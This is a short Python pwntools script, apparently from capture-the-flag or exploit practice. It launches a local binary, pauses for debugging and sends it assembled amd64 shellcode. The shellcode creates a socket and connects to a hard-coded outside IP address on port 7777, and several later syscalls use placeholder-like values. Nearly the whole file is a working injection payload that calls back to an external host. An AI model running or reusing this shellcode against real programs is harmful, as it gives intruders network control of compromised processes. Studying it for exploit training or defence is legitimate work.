#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.
from pwn import *
conn=process("./test")


code="""
    mov    eax,0x29
    mov    edi,0xffffffd9
    mov    esi,3
    mov    edx,0
    add    edi,eax
    sub    esi,edi
    and    edx,esi
    syscall
    movabs rax,0x8a0a4b2f611e0002
    push   rax
    mov    eax,0x2a
    mov    edx,0x10
    mov    edi,0x0
    mov    rsi,rsp
    syscall
    mov    edx,0x12121212
    add    eax,0x12
    syscall
    mov    DWORD PTR [rdi],ecx
    mov    eax,0x12121212
    mov    edi,0x12121212
    mov    r10d,0x12121212
    syscall
    pop    rax
"""



print conn.pid
pause()
conn.sendline(asm(code,arch="amd64"))
conn.interactive()